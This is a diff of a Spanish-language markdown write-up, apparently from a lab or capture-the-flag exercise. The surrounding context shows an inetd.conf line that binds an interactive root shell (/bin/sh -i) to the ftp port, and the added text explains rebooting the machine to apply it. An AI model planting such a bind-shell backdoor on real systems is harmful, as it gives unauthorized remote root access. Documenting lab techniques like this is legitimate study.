@@ -28,6 +28,8 @@ Modificamos el archivo de configuración *inetd.conf* para montar una bind shell
 ftp stream tcp nowait root /bin/sh -i
 ```
 
+Después de modificar la configuración, reiniciamos la maquina, ya que es la única forma que tenemos de reiniciar el servicio con la nueva configuración.
+
 ```bash
 $ sudo reboot
 ```
